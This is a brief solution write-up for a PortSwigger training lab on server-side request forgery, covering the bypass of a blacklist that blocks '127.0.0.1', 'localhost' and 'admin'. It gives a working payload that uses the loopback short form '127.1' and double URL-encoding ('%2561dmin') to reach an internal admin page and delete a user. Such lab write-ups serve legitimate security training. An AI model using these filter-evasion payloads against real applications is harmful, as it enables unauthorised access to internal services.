# Lab: SSRF with blacklist-based input filter (Practitioner)

**Lab:** [https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

**Task (from PortSwigger):**  
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.

## Vulnerability
Blacklist blocks `127.0.0.1`, `localhost`, and the string `admin`. Bypass with alternate IP form and double-encoding.

## Solution

1. `http://127.0.0.1/` is blocked.
2. Use `http://127.1/` (short form of loopback).
3. `/admin` is blocked → double-URL-encode `a` → `%2561`.

```
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

## Final Payload
```
stockApi=http://127.1/%2561dmin/delete?username=carlos
```
